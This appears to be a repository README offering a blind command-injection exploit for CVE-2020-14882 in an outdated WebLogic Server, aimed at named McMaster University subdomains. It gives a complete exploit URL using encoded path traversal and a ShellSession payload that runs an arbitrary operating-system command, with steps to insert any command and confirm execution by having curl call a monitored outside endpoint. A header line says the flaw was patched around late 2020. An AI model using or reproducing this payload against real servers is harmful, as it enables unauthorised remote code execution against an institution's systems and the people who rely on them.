(patched as of around 10/30/20)
# McMaster-University-Blind-Command-Injection
This targets McMaster University's website and takes advantage of CVE-2020-14882 in the outdated version of WebLogic Server (12.2.1.3.0), which is present in the university's subdomains, mosaic.mcmaster.ca and epprd.uts.mcmaster.ca.
# Usage
1. Replace "COMMAND" in [https://mosaic.mcmaster.ca/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('COMMAND');");](https://mosaic.mcmaster.ca/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('COMMAND');");)
2. Open the link. It should show an error but the command still runs. You can confirm it by using curl in the command to GET an endpoint URL that you monitor (which you can set in, for example, ReqBin). Then, when you open the link, an event should come up indicating that the curl command was successfuly executed.
